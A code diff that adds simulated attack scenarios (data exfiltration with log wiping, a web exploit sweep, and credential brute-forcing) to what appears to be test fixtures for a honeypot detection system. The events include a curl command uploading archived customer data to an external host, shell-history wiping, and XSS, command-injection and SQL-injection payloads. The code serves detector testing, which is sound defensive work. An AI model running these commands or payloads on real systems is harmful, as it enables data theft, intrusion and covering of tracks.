@@ -35,6 +35,21 @@ const ssh = (type: string, extra: Ev = {}): Ev => ({
 
 const SQLMAP_UA = 'sqlmap/1.7#stable';
 const FIREFOX_UA = 'Mozilla/5.0 (X11; Linux x86_64) Firefox/126.0';
+const HYDRA_UA = 'hydra/9.5';
+const NIKTO_UA = 'Mozilla/5.0 (Nikto/2.5.0)';
+
+/** A web login attempt against the admin decoy, as the agent normalises it. */
+const webAuth = (outcome: 'success' | 'failure', extra: Ev = {}): Ev => ({
+  sensor: 'web',
+  decoy_id: 'web-admin-admin',
+  is_decoy: true,
+  dst_service: 'http:/admin/login',
+  event_type: 'auth.attempt',
+  method: 'POST',
+  url: '/admin/login',
+  outcome,
+  ...extra,
+});
 /**
  * The token the `honeytoken` replay plants and then uses. Nothing joins this to
  * the `honeytokens` table — process-events stamps `first_used_at` by id and the
@@ -187,6 +202,98 @@ const SCENARIOS: Record<string, (ip: string) => Step[]> = {
       ev: web('web-admin-admin', '/admin?id=1;DROP TABLE users;--', {
         user_agent: SQLMAP_UA,
         status_code: 200,
+      }),
+    },
+  ],
+  // Mirrors attacker-demo/attacker-api/scenarios/exfil-cleanup.json: post-exploitation
+  // with anti-forensics. Default-cred login (R06), archive + read the bait exports
+  // (R11/R18), curl them to an external host (R09 transfer), then wipe history and logs
+  // — the only scenario that reaches defence evasion (R17).
+  'exfil-cleanup': () => [
+    { gap: 0, ev: ssh('ssh.client', { client_banner: 'SSH-2.0-OpenSSH_9.6' }) },
+    {
+      gap: 6,
+      ev: ssh('auth.attempt', { username: 'admin', password_clear: 'admin', outcome: 'success' }),
+    },
+    {
+      gap: 8,
+      ev: ssh('command.exec', {
+        username: 'admin',
+        command: 'tar -czf /tmp/loot.tgz /srv/exports',
+        outcome: 'success',
+      }),
+    },
+    {
+      gap: 7,
+      ev: ssh('command.exec', {
+        username: 'admin',
+        command: 'cat /srv/exports/customer_data.csv',
+        outcome: 'success',
+      }),
+    },
+    {
+      gap: 9,
+      ev: ssh('command.exec', {
+        username: 'admin',
+        command: 'curl -T /tmp/loot.tgz http://198.51.100.9/',
+        outcome: 'success',
+      }),
+    },
+    {
+      gap: 11,
+      ev: ssh('command.exec', {
+        username: 'admin',
+        command: 'history -c; rm -f ~/.bash_history; unset HISTFILE',
+        outcome: 'success',
+      }),
+    },
+  ],
+  // Mirrors attacker-demo/attacker-api/scenarios/web-exploit.json: a nikto-style sweep
+  // carrying four exploit families — XSS, command injection, traversal and SQLi. R05
+  // detects each (+10) but is capped at 20 (RULE_POINT_CAPS.R05), so two families show
+  // in the ledger; the nikto user-agent trips R03.
+  'web-exploit': () => [
+    {
+      gap: 0,
+      ev: web('web-admin-admin', '/search?q=<script>alert(1)</script>', {
+        user_agent: NIKTO_UA,
+        status_code: 404,
+      }),
+    },
+    {
+      gap: 1,
+      ev: web('web-admin-admin', '/ping?host=127.0.0.1;cat /etc/passwd', {
+        user_agent: NIKTO_UA,
+        status_code: 404,
+      }),
+    },
+    {
+      gap: 1,
+      ev: web('web-admin-admin', "/products?id=1' OR '1'='1", {
+        user_agent: NIKTO_UA,
+        status_code: 404,
+      }),
+    },
+  ],
+  // Mirrors attacker-demo/attacker-api/scenarios/web-bruteforce.json: a hydra-style
+  // credential-stuffing burst at the /admin login. Six failures inside 60 s trip R04;
+  // the default admin/admin then succeeds (R06). The hydra user-agent trips R03.
+  'web-bruteforce': () => [
+    { gap: 0, ev: web('web-admin-admin', '/admin', { user_agent: HYDRA_UA }) },
+    ...Array.from({ length: 6 }, (): Step => ({
+      gap: 2,
+      ev: webAuth('failure', {
+        user_agent: HYDRA_UA,
+        username: 'admin',
+        password_masked: 'P*******1',
+      }),
+    })),
+    {
+      gap: 2,
+      ev: webAuth('success', {
+        user_agent: HYDRA_UA,
+        username: 'admin',
+        password_clear: 'admin',
       }),
     },
   ],
